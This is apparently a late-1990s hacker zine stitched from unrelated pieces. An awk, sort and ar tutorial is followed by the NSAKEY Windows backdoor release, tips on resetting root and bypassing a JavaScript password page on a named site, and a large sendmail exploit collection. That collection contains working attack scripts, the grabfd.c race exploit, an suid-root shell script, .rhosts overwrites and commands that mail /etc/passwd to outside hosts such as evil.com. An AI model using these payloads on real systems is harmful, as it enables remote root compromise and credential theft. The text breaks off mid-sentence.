       while (conditional) statement
       for (expression;conditional;expression) statement
       break
       continue
       {[statement]...}
       variable=expression
       print [expression-list] [>expression]
       printf format [,expression-list][>expression]
       next # skip remaining pattern on this input line
       exit # skip the rest of the input

Statements are terminated by semicolons, new lines (Ret), or right braces.

Let's look at the syntax for awk in a little simpler manner.

       awk 'commands' [filename]

An awk program (commands) consists of a optional pattern to match and an action to perform if a match is found on the current line.  

This syntax looks like this:

       awk '/pattern/{action}' [filename]

The pattern used is a regular expression enclosed in forward slashes.  If no pattern is listed, the action will be performed for every line.  An action can contain several commands.  There can be multiple patterns and actions.

       awk '/pattern1/{action1}
       /pattern2/{action2}' [filename}

One of awk's commands is print.  It puts the current line on standard output.

Sample session:

   $awk '{print}' phone.lis                                    
   Smith, Joan         7-7989                                  
   Adams, Fran         2-3876                                  
   StClair, Fred       4-6122                                  
   Jones, Ted          1-3745                                  
   Stair, Rich         5-5972                                  
   Benson, Sam         4-5587                                  
   $                                                           

The awk splits every input line at whitespace and keeps track of the number of fields on each line and counts the number of lines read.  Each field is identified by its field number and a $.

       $1     Identifies the first field

       $2     Identifies the second field

       $0     Identifies the entire line

       NF     Identifies the number of fields on the line
       NR     Identifies the number of lines that have been read 

Sample session:

    $awk '{print NR,$1}' phone.lis                             
    1 Smith,                                                   
    2 Adams,                                                   
    3 StClair,                                                 
    4 Jones,                                                   
    5 Stair,                                                   
    6 Benson,                                                  
    $                                                          

To change the order of the names in phone.lis, use awk.  The comma in the print command tells awk to separate each field with a space.  Without the comma, the output would have no spacing.

Sample session:

    $awk '{print $2, $1 "&lt;tab>"$3}' phone.lis                  
    Joan Smith,        7-7989                                  
    Fran Adams,        2-3876                                  
    Fred StClair,      4-6122                                  
    Ted Jones,         1-3745                                  
    Rich Stair,        5-5972                                  
    Sam Benson,        4-5587                                  
    $                                                          

sort: SORT A FILE

The sort utility sorts line of all the named files together and writes the result to standard output.  The standard input is used if - is used as a file name or no input files are specified.

Comparisons are based one or more sort keys extracted from each line of input.  There is only one key by default, that's the entire line, and ordering is lexicographic by bytes in machine collating sequence.

    Command format: sort [-cmu][-ooutput][-ykmem][-zrecsz]     
                         [-dfiMnr][-btx][+pos][-pos2][files]   
                                                               
     See on-line manual for options etc.                       


The easiest way to use sort is to add it at the end af a pipeline.  What does the following command line accomplish:

Sample session:

   $grep '&lt;tab>[45]' phone.lis | sed 's/&lt;tab>/&lt;tab>73/' | sort 
   Benson, Sam         734-5587                                
   StClair, Fred       734-6122                                
   Stair, Rich         735-5972                                
   $                                                           
 
The grep command will select only those records that have a 4 of a 5 in the phone number, those records are then sent to sed which will add "73" just after the tab character, then the records are sent to sort and put in alphabetical order.  Notice that there is a problem here, should StClair come before Stair in an alphabetical listing?  The answer is NO.  Why did this happen?  It occurred because of the collating sequence for the default sort.  This can be fixed by specifying some options on the call to the  sort utility.  Here are some options for sort.  Let's see if we can determine how to remedy the problem discovered in the default sort.

sort options:

       -f     Fold lower case into upper case
       -r     Reverse the sort from highest to lowest
       -b     Ignore leading blank spaces
       -d     Dictionary sort - ignore nonalphanumeric characters
       -m     Merge two sorted files together
       -n     Sort the list as numbers not digit characters

Notice the -f options folds lower case into upper case.  This option will make the sort for our problem work correctly.

Sample session:

 $grep '&lt;tab>[45]' phone.lis|sed 's/&lt;tab>/&lt;tab>73/'|sort -f    
   Benson, Sam         734-5587                                
   Stair, Rich         735-5972                                
   StClair, Fred       734-6122                                
   $                                                           
 
The sort can also be directed to use only a portion of the line as a sorting key versus the entire line.  The utility will automatically break each line into fields at whitespace delimiters.  You can use a character other than whitespace by using the -t option.  

The fields are set up like this:

        0     1        2
      /----|/---|/-------------|
       Adams, Fran         2-3876

In order to sort by the second field, here is the sort command to enter.
 
Sample session:

    $sort +1 phone.lis                                         
    Adams, Fran        2-3876                                  
    StClair, Fred      4-6122                                  
    Smith, Joan        7-7989                                  
    Stair, Rich        5-5972                                  
    Benson, Sam        4-5587                                  
    Jones, Ted         1-3745                                  
    $                                                          

Here's a sample of a sort on the 3rd field.

Sample session:

     $sort +2 phone.lis                                        
     Jones, Ted        1-3745                                  
     Adams, Fran       2-3876                                  
     Benson, Sam       4-5587                                  
     StClair, Fred     4-6122                                  
     Stair, Rich       5-5972                                  
     Smith, Joan       7-7989                                  
     $                                                         

A sort can also be performed by a character position within a field.

Sample session:

    $sort +2.4 phone.lis                                       
    StClair, Fred           4-6122                             
    Benson, Sam             4-5587                             
    Jones, Ted              1-3745                             
    Adams, Fran             2-3876                             
    Stair, Rich             5-5972                             
    Smith, Joan             7-7989                             
    $                                                          
NOTE:         The first character of a field is the delimiter for that field.

5.1  ARCHIVER AND LIBRARY MAINTAINER

This command will maintain groups of files combined into a single archive file.  The main use of ar is to create and update library files as used by the link editor.  It can also be used for any other similar purpose.  The file header consists of printable ASCII characters.  If the archive consists of printable characters, then the entire archive is also printable.
                                                                 
Command Format:  ar key [posname] afile [name]...             

Unlike command options, the command key is required.  The key,  usually a - sign, is formed with one of the following letters  drqtpmx.  Arguments to the key are made from one or more of  the following set, vuaibcis.  

See Appendix I for a complete list of command keys.                                          

posname is an archive member name used as a reference for positioning other files in the archive.                       

afile is the name of the archive.                             

name[s] are the constituent files in the archive.             
                                                               
To illustrate how to create and use an archive file, we will use the "C" program called main.c and the two functions, funct1.c and funct2.c.   First, create the object files that we intend to put into the archive file.

Sample Session:

 $cc -c main.c funct1.c funct2.c                               
 main.c:                                                       
 funct1.c:                                                     
 funct2.c:                                                     
 $ls -C *.o                                                    
 funct1.o funct2.o main.o                                      
 $                                                             

Remember the -c option will not produce an executable module, but it does create the object modules.  These object modules are file files that we will place into an archive.

5.2  Creating an Archive File with Object Modules

In this call to ar, we will use the r command key which will replace the named files in the archive.  The v option will give a verbose file-by-file description of the making of the new archive file.

Sample Session:

 $ar rv functs.a funct1.o funct2.o                             
 a - funct1.o                                                  
 a - funct2.o                                                  
 ar: creating functs.a                                         
 $                                                             

The name of the new archive file is functs.a.  The files that have been added to that archive are funct1.o and funct2.o.  The file protections for the new archive file are rw-r--r--.

5.3  Verifying the Contents of the Archive File

The key command to list the table of contents is t.  The t command will print a table of contents of the archive file.  When the v option is used with the t command it will give a long listing of all information about the files.

Sample Session:

 $ar tv functs.a                                               
 rw-r--r--    115/    200 448 Sep 27 09:56 1990 funct1.o       
 rw-r--r--    115/    200 448 Sep 27 09:56 1990 funct2.o       
 $                                                             

This output shows that there are two members in this archive file, namely, funct1.o and funct2.o.

The protections of these files is:

       owner - read and write
       group - read
       other - read

The fields are, left to right, the file protections, owner, group, size (in bytes), creation date and time, and finally the name of the constituent.

5.4  Removing Duplicate Object Files

Once the archive has been created and verified, the object files in your directory can be deleted.  This can be accomplished with the rm command.

Sample Session:

 $rm funct?.o                                                  
 $                                                             

The question mark (?) is a wildcard that stands for any single character.  The files funct1.o and funct2.o no longer exist in your subdirectory.

5.5  Compiling Main and Archive Files

Now that the object files, funct1.o and funct2.o, are in the archive file functs.a you, can link them with main.o in the following manner.

Sample Session:

 $cc -o new_hello main.o functs.a                              
 $ls -la new_hello                                             
 -rwxr-xr-x  1 teacher class  17570  Sep 27 12:58 new_hello    
 $                                                             

+++++++++++++++++++++

0011	MS-NSAAdvisory from  Andrew Ferrnades

Microsoft, the NSA, and You
FOR IMMEDIATE RELEASE 

Microsoft Installs US Spy Agency with Windows 

Research Triangle Park, NC - 31 August 1999 - Between Hotmail hacks and browser bugs, Microsoft has a dismal track record in computer security.  Most of us accept these minor security flaws and go on with life. But how is an IT manager to feel when they learn that in every copy of Windows sold, Microsoft may have installed a 'back door' for the National Security Agency (NSA - the USA's spy agency) making it orders of magnitude easier for the US government to access their computers? 

While investigating the security subsystems of WindowsNT4, Cryptonym's Chief Scientist Andrew Fernandes discovered exactly that - a back door for the NSA in every copy of Win95/98/NT4 and Windows2000. Building on the work of Nicko van Someren (NCipher), and Adi Shamir (the 'S' in 'RSA'), Andrew was  investigating Microsoft's "CryptoAPI" architecture for security flaws. Since the CryptoAPI is the fundamental building block of cryptographic security in Windows, any flaw in it would open Windows to electronic  attack.

Normally, Windows components are stripped of identifying information. If the computer is calculating "number_of_hours = 24 * number_of_days", the only thing a human can understand is that the computer is multiplying "a = 24 * b". Without the symbols "number_of_hours" and "number_of_days", we may have no idea what 'a' and 'b' stand for, or even that they calculate units of time.  

In the CryptoAPI system, it was well known that Windows used special numbers called "cryptographic public keys" to verify the integrity of a CryptoAPI component before using that component's services. In other words, programmers already knew that windows performed the calculation "component_validity = crypto_verify (23479237498234. ..,crypto_component)", but no-one knew exactly what the cryptographic key "23479237498234..." meant semantically. 

Then came WindowsNT4's Service Pack 5. In this service release of software from Microsoft, the company crucially forgot to remove the symbolic information identifying the security components. It turns out that there are really two keys used by Windows; the first belongs to Microsoft, and it allows them to securely load CryptoAPI services; the second belongs to the NSA. That means that the NSA can also securely load CryptoAPI services... on your machine, and without your authorization. 

The result is that it is tremendously easier for the NSA to load unauthorized security services on all copies of Microsoft Windows, and once these security services are loaded, they can effectively compromise your entire operating system. For non-American IT managers relying on WinNT to operate highly secure data centers, this find is worrying. The US government is currently making it as difficult as possible for "strong" crypto to be used outside of the US; that they have also installed a cryptographic back-door in the world's most abundant operating system should send a strong message to foreign IT managers.

There is good news among the bad, however. It turns out that there is a flaw in the way the "crypto_verify" function is implemented. Because of the way the crypto verification occurs, users can easily eliminate or replace the NSA key from the operating system without modifying any of Microsoft's original components. Since the NSA key is easily replaced, it means that non-US companies are free to install "strong" crypto services into Windows, without Microsoft's or the NSA's approval. Thus the NSA has effectively removed export control of "strong" crypto from Windows. A demonstration program that replaces the NSA key can be found on Cryptonym's website. 

Cryptonym: Bringing you the Next Generation of Internet Security, using cryptography, risk management, and public key infrastructure. 

Interview Contact:
   Andrew Fernandes
   Telephone: +1 919 469 4714	Fax: +1 919 469 8708 

Cryptonym Corporation
1695 Lincolnshire Boulevard
Mississauga, Ontario
Canada  L5E 2T2 

http://www.cryptonym.com 

The Full Details

These details are essentially the contents of the "Rump Session" talk that Andrew Fernandes gave at the Crypto '99 Conference, on 15 August 1999, in Santa Barbara, California.

Note 1: many people have written us and assumed that we "reverse engineered" Microsoft's code. This is not true; we did not reverse engineer Microsoft code at any time. In fact, the debugging symbols were found using standard Microsoft-purchased programmer's tools, completely by accident, when debugging one of our own programs.

Note 2: many reporters have stated that Andrew studied computer science at the University of Waterloo and was a classmate of Ian Goldberg of Zero Knowlege Systems. In fact, Andrew studied biochemistry and mathematics at Waterloo for his undergraduate, and mathematics at McGill for his graduate work. He and Ian graduated in the same year, but really did not know each other at the time.

An Overview of the Microsoft's CryptoAPI Microsoft's CryptoAPI allows independent software vendors (ISVs) to dynamically load Cryptographic Serivce Providers (CSPs) as in the following diagram:

This arrangement of having Windows verify the CSP signature is what allows Microsoft to add cryptographic functionality to Windows. They will not digitally sign a CSP unless you first agree to abide by US export rules. Translation: Microsoft will not allow non-US companies to add strong crypto functions to Windows.

Fortunately, the verification of the CSP's digital signature opens up a security flaw in this picture.

Observations
Using NT4 Server, SP5 (domestic, 128-bit encryption version), and Visual C++ 6, SP3. These same results have been found in Win95osr2, Win98, Win98gold, WinNT4 (all versions), and Win2000 (up to and including build 2072, RC1).

Many people have emailed us to say that these debugging symbols are actually present in NT4-Workstation, and are in the original CD's debugging symbols! Thanks, people!

Before CSP loading in ADVAPI32.DLL	
Address 0x77DF5530 -> A9 F1 CB 3F DB 97 F5 ... ... ...	
Address 0x77DF55D0 -> 90 C6 5F 68 6B 9B D4 ... ... ...	

After RC4 encryption using we see	
A2 17 9C 98 CA => R S A 1 ... 00 01 00 01 ... 
                                  (looks like an RSA public key)
A0 15 9E 9A C8 => R S A 1 ... 00 01 00 01 ... 
                                 (looks like an RSA public key)

Looking at SP5 debugging symbols in "_CProvVerifyImage@8"	
Address 0x77DF5530 <- has data tag "_KEY"
Address 0x77DF55D0 <- has data tag "_NSAKEY"	
The Flaw
An attack:
Replace "_KEY" with your own key... 
...but Windows will stop working since it cannot verify its own security subsystem! 

An better attack:
Replace "_NSAKEY" with your own key... 
... Windows keeps working, since Microsoft's key is still there 
stops the NSA 
works because Windows tries to verify the CSP first using "_KEY", and then silently fails over to "_NSAKEY" 

The Result:
Windows CryptoAPI system still functional 
the NSA is kicked out 
the user can load an arbitrary CSP, not just one that Microsoft or the NSA signed! 

Implications
What is the purpose of "_NSAKEY"? Espionage? Or do they simply not want to rely on Microsoft when installing their own CSPs? 

Using RSA's Data Security's (now Security Dynamics) "BSafe" toolkit actually makes analysis of a program easier. 

We do not need to modify the "advapi32.dll" file in order to remove the NSA key, nor do we need special privilleges on the machine. 
use self-modifying code needs undocumented vxd calls under Win95 and Win98 needs special memory features under WinNT and Win2k 
It is easy for any process to bypass any CSP and substitute its own. 
Export control is effectively dead for Windows. Note for Win2k - there appear to be three keys in Win2k; Microsoft's, the NSA's, and an unknown third party's. Thanks to Nicko van Someren for bringing this to our attention. 

Removing the NSA
A sample program which temporarily replaces the NSA key with a test key, and leaves the rest of the CryptoAPI system intact, can be downloaded by clicking this link (currently only for WinNT and Win2k).

For legal reasons, source code will be provided for free, but only be available through a Nondisclosure Agreement with Cryptonym. You can download the NDA here in Word/Wordperfect RTF format, PostScript PS format, or Acrobat PDF format. Make sure you initial all pages, and fax it to the phone number indicated.

These files are provided for demonstration purposes only, and may not be redistributed or used for any purpose other than demonstration without the written authorization and license of Cryptonym Corporation. For more information, please contact:

Andrew Fernandes 
Phone +1 919 469 4714
Fax   +1 919 469 8708

Win95/98 Programmers:  we could use help in porting the software to Win95/98. If you have a strong background in Win95/98 virtual memory management, virtual device writing, and Windows 'internals', and don't mind volunteering your time, please contact Andrew at the addresses above!

+++++++++++++++++++++

0100	Interview with the Cryptography Scientest Andrew Ferrnades by Forensic

+++++++++++++++++++++

0101	Snippets 411 compiled by The Raven

** WIN 98 411:

 While setting up Windows 98 Policies and Procedures for one of our more  paranoid customers, I accidentally locked myself out of a workstation.  I  accidentally set the "Run only approved progams" flag and neglected to  list any programs, making it impossible to run *any* programs, including poledit.

 After a re-install of 98 failed to remove the protection, I made an
 observation: Systray appeared to load every time.  So what I did, was
 rename poledit.exe to systray.exe and copied it into the windows
 directory.  Sure enough, poledit executed on the next boot and I was    
 able to fix everything.

______________________________________________________
      /\                                 "If they give you lined paper,     
     // \ arclight@exo.com                write the other way."
 ~~~//~~~\~~~                              
   //     \RCLIGHT                          -Unknown
______________________________________________________

** Resetting the root password on a FreeBSD Box 
(Requires physical access to the box)
by Raven

Okay, so you'll need physical access for this one. It
still goes to show that some systems have very 
rudimetary features/flaws that can be utilized.
This one is courtesy of the wife all.
 -archive

1) Restart the system

2) type -s at the Boot: prompt to enter Single User    
   mode.

3) At the question about the shell to use, hit ENTER.    
   You should be dropped to a # prompt.

4) Enter 'mount -u /' to remount your root filesystem read/write

5) run 'mount -a' to remount all the filesystems.

6) Run passwd root to change the root password then run exit 
   to continue booting.

** Windows NT Server 4.0 Outperforms Solaris

Mindcraft, a Microsoft-certified testing lab, recently released a 
report that shows Windows NT Server 4.0 on a dual Pentium II/450 MHz system with 2 GB of RAM is more than 25 percent faster and offers 2.7 times better price-performance than Solaris x86 on a 486DX2.

** Java Password Scripting: No replacement for strong Cryptography

Well as most of you know, I love to play with a little bit of everything
while cryptography is a minor passion of mine it is by no means a major
study to which I devote a vast amount of time.  

While recently surfing some sites I came across a couple of java based 
password protected diretory listings.  This one is owned by a military 
sponsored organization (www.chcnavy.org).  While I studied the site and played with them I was amazed at how little effort it was to crack the 
pass phrase on this sites.

While including java script into a page is good for ease of loading and
does allow for maintaining some level of security, it is no replacement
for the use of strong encryption of those files or a cgi based security
program to deal strictly with securing online information.

* First glance *

First you click and are met with a sudden prompt to "ENTER A PASSWORD" the browser is locked up waiting for a response from you.  A couple of brute force attempts and you are kicked back to the main site. Do you give up? Do you attempt to get a little more creative with your thinking? Do you simply walk away and surf to another site? Nope. Of course you don't. You are a hacker. You don't let a little thing like a java script get in your way do you? Well what do you do when a java script jumps up at you? You sweeten it with a little of your own home brewed sweet-n-low.

One lumps or two?

Okay now on to the fun stuff.  Okay so now what? I keep getting this 
password page that freezes up and stops my browser from doing any
thing else when I try to access the page.  Alright, big secret time.
From the link to the password page just do a quick download of the
page to your box. Windows users, right click and Save As. Really
easy work isn't it? Now just save the file as a text file and you'll
be able to open it and look at it with no problem what so ever.

Yeah right, sure you can.  Don't believe me? Okay, a little hands on 
work for you to try it out on. http://eua.tzo.org/eclass/pass1.htm
You'll go directly to the entry page. You'll see the link. Hit the link
and you'll be thrown right into the password.htm page, try to brute it
all you want. Unless you know the password you'll just keep getting 
tossed back right?  Now do what I told you and you'll be able to find 
the password no problem.

The above mentioned page by the way was the one used by a military 
affiliated organization. Good to go .mil!!!

+++++++++++++++++++++

0110	SendMail Info by Zhart

I wanna say that I don't take any credit for this text, I simply collected
and reorganized all the info that was all around for my harddisk (and in my
head), just commented some bugs or added something; sometimes I haven't
even tested the source codes.

I started compiling this list for my own use, then I thought it would be
interesting also for other ppl, mainly beginners, or maybe nobody. For any
comments you can reach me on L.O.R.E. bbs

  Hole                         			Version of Sendmail
= WIZ =                        				*oLD*
= DEBUG =                      				*oLD*
= TURN =                       				*oLD*
= OVERFLOW INPUT BUFFER =      		*oLD*
= DECODE ALIAS =               			*VrFy*
= qf SunOS =                   				*SunOS-sendmailV5.1*
= -oR SunOS =                  				*SunOS-sendmailV5.22*
= -oM =                        				*8lgm6Dec1994-SMI-Sendmail(sm based on SunOS)*
= OVERWRITE FILES =            			*FiXED iN 5.59*
= -oQ =                        				*DuNNo*
= |PROGRAM =                   				*TeSTeD oN 5.55*
= .forward =                   				*5.61*
= TAIL =                       				*TeSTeD oN 5.65*
= -C =                         				*oLD*
= 4.1 =                        				*TeSTeD oN 4.1*
= -d########### =              			*8.X.X <8.6.7*
= -oE/filename bounce=         			*8.6.7*
= 8.6.9 ident =                				*8.6.9*
= 8.6.9 newlines =             				*8.6.9*
= 8.6.10 ident/newlines =      			*8.6.10*
= HP-UX =                      				*HP-UX 9.x*
= 8.7.5 gecos =                				*8.X.X <8.8.0* *TeSTed oN 8.6.12*
= mime7to8() =                 				*8.8.0*
= smtpd =                      				*8.7-8.8.2*
----------------------------------------------------------------

WIZ = *oLD* =

The oldest and easiest hole in sendmail is the 'wiz' backdoor, now very
difficult to find. At the connect just type 'wiz' and then 'SHELL' ,and
you're in a root shell. [ it can be set by configuring sendmail.cf file ...
'OW' option immediately followed by the encrypted password ]

DEBUG = *oLD* =

This bug was used by the inet worm by Robert T. Morris Jr. Its exploiting
allows anyone to execute any program on a remote machine. It simply
consists in giving the 'debug' command, use a pipe to /bin/sh as recipient
and feed the data with the commands you want to be executed on the remote
machine.

[ If sendmail server answers with "200 Debug set" to the 'debug' command
there are good chances the bug is still present ]

Example :

#!/bin/sh
telnet << EOF
open fucked.host.edu 25
debug
mail from: &lt;/dev/null>
rcpt to: <\"|sed -e '1,/^$/'d | /bin/sh ; exit 0\">
data

cp /bin/sh /tmp/sushi          # or alternatively:
chmod 4755 /tmp/sushi          # echo "+ +" >> /.rhosts
.
EOF

TURN = *oLD* =

TURN command allows mail to be stolen ... [ Don't bother, old stuff! ]

OVERFLOW INPUT BUFFER = *oLD* =

Cause the sendmail deamon to lock up ... [ old stuff! Just for collection
;) ]

DECODE ALIAS = *VrFy* =

If '/etc/aliases' contains "|/usr/bin/uudecode" anyone can send mail to
decode, write to any file onwed by daemon, if they can connect to sendmail
daemon, can write to any file owned by any user.

To test the existence of decode alias from a sendmail connection do:

% telnet target.com
Trying 127.127.127.127
Connected to target.com
Escape character is '^]'.
220 target.com Sendmail Sendmail 5.55/victim ready at Fri, 6 Nov 93 18:00 PDT
expn decode
250 <"|/usr/bin/uudecode">
quit

1SecExploit:

% echo "myhost.com" | uuencode /usr/bin/.rhosts | mail decode@target.com

MoreThan1SecExploit:

% cat > outfile                  # Let's make our .rhosts file
+ +
^C
% uuencode outfile /usr/bin/.rhosts
begin 644 /bin/.rhosts
$*R'K"O\

% telnet fuqdhost.com 25
220 fuqdhost.com SunOS Sendmail 8.6.1 #5 ready at Fri, 13 May 99 00:00 (EST)
VRFY decode
250 <|/usr/bin/uudecode>
MAIL FROM: bin
250  ... Sender Okay
RCPT TO: decode
250  ... Recipient Okay
DATA
354 Enter mail, end with "." on a line by itself
begin 644 /bin/.rhosts
$*R'K"O\                       # which is just "+ +" uuencoded

end
.
250 Mail accepted
quit
221 fuqdhost.com closing connection
Connection closed by foreign host.
% rlogin fuqdhost.com -l bin
$

If no home directories are known or writable, an interesting variation of
this is to create a bogus /etc/aliases.pag file that contains an alias with
a command you wish to execute on your target. This may work since on many
systems the aliases.pag and aliases.dir files, which control the system's
mail aliases, are writable to the world.

 evil % cat decode
 bin: "| cat /etc/passwd | mail zen@evil.com"
 evil % newaliases -oQ/tmp -oA`pwd`/decode
 evil % uuencode decode.pag /etc/aliases.pag | mail decode@victim.com
 evil % /usr/lib/sendmail -fbin -om -oi bin@victim.com < /dev/null

qf SunOS = SunOS-sendmailV5.1 =

The method used by sendmail version 5 to open a control file
[/usr/spool/mqueue/qf########] is unsecure. A race condition exists whereby
another process may obtain a control-file file descriptor, opened for write
access. Sendmail v5, during execution, sets umask(0), which is an insecure
mask. In order not to leave open control files with mode 666, sendmail v5
uses chmod(2) to set a secure file mode. However this is a race condition,
as we can obtain an open file descriptor for write by opening the control
file before the call to chmod(2).

IMPACT: Local users can write their own control files, and run programs
        as any user, bar root.

EXPLOIT:

grabfd.c:

/*
 * grabfd.c
 * usage: grabfd username command-file
 *
 *      username: user to execute 'command-file' as.
 *      command-file: file containing 10 lines of shell commands to execute.
 */

#include &lt;stdio.h>
#include &lt;unistd.h>
#include &lt;sys/fcntl.h>
#include &lt;sys/param.h>

#ifndef SENDMAIL
#define SENDMAIL "/usr/lib/sendmail"
#endif

#ifndef SPOOL_DIR
#define SPOOL_DIR "/usr/spool/mqueue"
#endif

char myqfile[] = "D%s\nC%s\nR|/usr/ucb/tail|/bin/sh\n";

main(argc,argv)
int argc;
char **argv;
{
        int pid, fd;
        char tbuf[MAXPATHLEN], sysbuf[BUFSIZ];

        if (argc != 3) {
                (void)fprintf(stderr, "%s: user file\n",
                        argv[0]);
                exit(1);
        }

        if (getpwnam(argv[1]) == NULL)
                (void)fprintf(stderr, "%s: user %s unknown (error
ignored)\n",
                        argv[0],
                        argv[1]);

        if (access(argv[2], F_OK) == -1) {
                (void)fprintf(stderr, "%s: %s does not exist.\n",
                       argv[0],
                       argv[2]);
                exit(1);
        }

        if (access(SPOOL_DIR, X_OK) == -1) {
                (void)fprintf(stderr, "%s: cannot access %s.\n",
                        argv[0],
                        SPOOL_DIR);
                exit(1);
        }

        if (pid=fork()) {

                if (pid == -1) {
                        (void)perror("fork");
                        exit(1);
                }

                (void)sprintf(tbuf, "%s/tfAA%05d", SPOOL_DIR, pid);
                (void)sprintf(sysbuf, myqfile, argv[2], argv[1]);

                for (;;)
                        if ((fd=(open(tbuf, O_WRONLY, 0))) != -1) {
                                (void)printf("%s: grabbed queue fd.\n",
                                             argv[0]);
                                (void)wait();
                                (void)ftruncate(fd, 0);
                                (void)write(fd, sysbuf, strlen(sysbuf));
                                (void)close(fd);
                                if(execl(SENDMAIL,
                                      "sendmail", "-q", (char *)0) == -1) {
                                        (void)perror("execl");
                                        exit(1);
                                        };
                        }
        } else {
                (void)close(0);
                if (open("/etc/motd", O_RDONLY, 0) == -1) {
                        (void)perror("open");
                        exit(1);
                };

                if (execl(SENDMAIL,
                          "sendmail",
#ifdef sun
                          "-os",
#endif
                          "-odq", getlogin(), (char *)0) == -1) {
                        (void)perror("execl");
                        exit(1);
                };
        }
        exit(1);
}

::::::::::::::::::::::::::::::::: END OF HOLE ::::::::::::::::::::::::::::

-oR SunOS = SunOS-4.1.X-sendmail V5.22 =

From 8lgm:

DESCRIPTION: The -oR option uses popen() to return undeliverable mail.

IMPACT: Local users can obtain root access.

-------------------------- ropt.sh ---------------------------------------

#!/bin/sh
#
# Syntax: roption host
#
# host is any system running sendmail (except localhost).
#
# This exploits a flaw in SunOS sendmail(8), and attempts
# create a suid root shell
#
# Written 1995 by [8LGM]
# Please do not use this script without permission.
#

PROG="`basename $0`"
PATH=/usr/ucb:/usr/bin:/bin      export PATH
IFS=" "                          export IFS

# Check args
if [ $# -ne 1 ]; then
        echo "Syntax: $PROG host"
        exit 1
fi

# Check we're on SunOS
if [ "x`uname -s`" != "xSunOS" ]; then
        echo "Sorry, this only works on SunOS"
        exit 1
fi

PROG="`basename $0`"

EXECME=/tmp/HotterThanMojaveInMyHeart

# Create EXECME.c

cat > $EXECME.c << 'EOF'
main(argc,argv)
int argc;
char *argv[];
{
        chown("/tmp/InfamousAngel", 0, 0);
        chmod("/tmp/InfamousAngel", 04755);
}
EOF

cc -o $EXECME $EXECME.c

# Check we have EXECME

if [ ! -x $EXECME ]; then
        echo "$PROG: couldnt compile $EXECME.c - check it out"
        exit 1
fi

/bin/cp /bin/sh /tmp/InfamousAngel
# Run sendmail

/usr/lib/sendmail -oR$1 -f";$EXECME;" -t << 'EOF'
To: No1InParticular

Hows it goin
EOF

exec /tmp/InfamousAngel

-oM = 8lgm6Dec1994-SMI-Sendmail(based on SunOS sm) =

Sun sendmail allows -oM to set any macro, and still retains root privilege.
( The list of 'trusted' macros should be limited. )

At time of writing (Dec 1994) affected sendmail were: " SunOS 4.x Sendmail
- all versions including latest 4/5/94 Sendmail Jumbo Patch 100377-15 "

After further investigation, it has been discovered that SVR4 based ports
include sendmail(8) based on SMI code.

EXPLOIT:

  1. Create the file sunsendmailcp

     #!/bin/sh
     #
     # sunsendmailcp from to

     if [ $# -ne 2 ]; then
             echo usage: `basename $0` from to
             exit 1
     fi

     rm -f /usr/tmp/dead.letter
     if [ -f /usr/tmp/dead.letter ]; then
             echo sorry, cant continue - /usr/tmp/dead.letter exists
     fi

     if [ ! -r $1 ]; then
             echo $1 doesnt exist or is unreadable
             exit 1
     fi

     ln -s $2 /usr/tmp/dead.letter
     /usr/lib/sendmail -L0 '-oM#anything' $USER < $1
     rm /usr/tmp/dead.letter
     exit 0

  2. Execute the command % ./sunsendmailcp sourcefile targetfile and target
     file will either be appended to or created.

OVERWRITE FILES = FiXED iN 5.59 =

Remote users are able to write to any non-root owned files in the system.
This bug was definitely fixed in version 5.59 from Berkeley; despite the
messages below, for versions of sendmail previous to 5.59, the "evil.com"
gets appended, despite the error messages, along with all of the typical
mail headers, to the file specified:

 % cat evil_sendmail
 telnet victim.com 25 << EOSM
 rcpt to: /home/zen/.rhosts
 mail from: zen
 data
 random garbage
 .
 rcpt to: /home/zen/.rhosts
 mail from: zen
 data
 evil.com
 .
 quit
 EOSM


 evil % /bin/sh evil_sendmail
 Trying 128.128.128.1
 Connected to victim.com
 Escape character is '^]'.
 Connection closed by foreign host.

 evil % rlogin victim.com -l zen
         Welcome to victim.com!
 victim %

'-oQ' = DuNNo =

This bug involves the '-q' and the '-oQ' options and causes any file to be
deleted and read. You should create a 'qf'-type file, in the
/usr/spool/mqueue dir, like this:

P28
T599831504
Dfilename
Suser
Ruser
H?P?return-path:
H?F?from: user (User Name)
H?x?full-name: User Name
HTo: user
Hsubject: Gotcha

after the command `sendmail -q -oQ' is issued, file `filename' will be
deleted and its content will be mailed to 'user'.

- - - - The 'oQ' sets the 'Q' option ,which selects the dir in which to
queue messages The 'q' make the daemon to process the queue - - - -

'|PROGRAM ' = TeSTeD oN 5.55 = ...may be others

Anyone can specify arbitrary shell commands and/or pathnames for the sender
and/or destination address. A typical attack to get the password file is:

 % telnet target.com 25
 Trying 123.456.789.0...
 Connected to target.com
 Escape character is '^]'.
 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51
 mail from: "|/bin/mail me@myhost.com < /etc/passwd"
 250 "|/bin/mail me@myhost.com < /etc/passwd"... Sender ok
 rcpt to: mickeymouse
 550 mickeymouse... User unknown
 data
 354 Enter mail, end with "." on a line by itself
 .
 250 Mail accepted
 quit
 Connection closed by foreign host.
 %

.forward = 5.61 =

When delivering to files and programs, `sendmail' does not do an
`initgroups(3)' after forking on final delivery. As a result, the sender's
group list remains in effect throughout this stage. This is particularly
serious when root is sending the mail since a program executed out of a
`.forward' file gains interesting privileges like `wheel' and `kmem'. A
related hole can be broken down into a "problem" and an "aggravation". The
"problem" is that queued local mail no longer has the original recipient's
uid associated with it. Control files only store a list of exploded
recipients (i.e. users, files and programs) -- one per line -- each
prefaced with an `R'.

So, after an address resolves to the local machine and has undergone alias
and ".forward" expansion, if the letter happens to get queued, on the
succeeding queue run sendmail doesnt know who to run the final delivery as.
The "aggravation" is that, when doing this final delivery of queued local
mail, sendmail will `setuid()' itself to the sender's uid if it is
available; in general, the sender's uid will be used when the sender is on
the local machine. As a result, a user can run a program as anyone who
sends them mail from the local machine. There is also an added
"complication"; the default uid and gid are also set to the sender when
delivering mail! Since the default uid and gid are only used when calling
`setuid()' and `setgid()' (to reset the uid/gid before doing final
delivery), these variables should never be set to the sender.

              |------------------------------ Local compromise
                      ------------------------------|

Save the following program as "sploit.c" changing MYUID to your user id.
Compile "sploit.c" producing the executable "sploit" in your home
directory. Create a ".forward" file containing:

     \&lt;user>, "|&lt;path>/sploit"

[change to your username so you dont lose mail (unless, of course, you'd
rather lose mail) and set &lt;path> to your home directory path (where sploit
lives)] Now, as another user, send yourself some mail. Note that the sploit
program defers delivery the first time thru; check out "/tmp/whoami" to see
that sploit ran as you. Now, run your mail queue (or open a beer and wait
for sendmail to run it). After the queue run, note that the sploit accepted
the letter and returned a successful exit status; check out "/tmp/whoami"
again to see that this time, sploit ran as the sender! You can also use
"sploit.c" to test for the root initgroups() hole by checking the group
